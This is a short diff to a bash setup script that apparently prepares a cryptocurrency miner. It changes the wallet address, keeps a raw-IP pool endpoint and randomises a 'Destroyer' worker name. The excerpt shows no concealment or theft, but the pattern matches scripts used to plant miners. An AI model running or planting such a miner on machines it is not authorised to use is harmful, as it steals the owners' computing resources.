@@ -1,9 +1,10 @@
 #!/bin/bash
-WALLET="45UDPB9Gh3EZX1hj9tSTi14hcSaosnRBei8LHHU5MHtkMLqvRBt7jsqg9WaDMkwUgXUPaGoVDfVZzSvXccore6tn8iiNshb"
+WALLET="88EnR9FVvgbLya5AZS1R7qbMZFeyhUP5xDh896K6yJfTP8eUvoU33FPg9yoG3easQXifU7wwAuN2DJaTNARpE9Tg9VE1ZZj"
 POOL="185.132.53.3:2222"
-WORKER="Destroyer3"
+WORKER="Destroyer-$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)"
 
 echo "[+] Starting setup..."
+echo "[+] Using worker name: $WORKER"
 
 install_dependencies() {
     sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
